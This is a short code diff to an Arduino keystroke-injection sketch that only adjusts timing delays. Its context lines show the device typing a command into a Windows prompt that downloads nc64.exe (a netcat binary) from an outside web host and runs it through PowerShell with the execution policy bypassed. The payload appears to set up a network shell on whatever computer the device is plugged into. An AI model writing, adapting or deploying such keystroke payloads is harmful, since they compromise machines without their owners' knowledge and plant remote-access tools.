@@ -26,10 +26,10 @@ Keyboard.press(KEY_LEFT_MAJ);
 Keyboard.press(KEY_RETURN);
 delay(50);
 Keyboard.releaseAll();
-delay(1000)
+delay(1500)
 typeKey(KEY_LEFT_ARROW);
 typeKey(KEY_RETURN);
-delay(400);
+delay(500);
 Keyboard.print("cd / & mkdir win & cd win & echo (wget 'https://perso.telecom-paristech.fr/rguilloteau/nc64.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");
 typeKey(KEY_RETURN);
 delay(100);
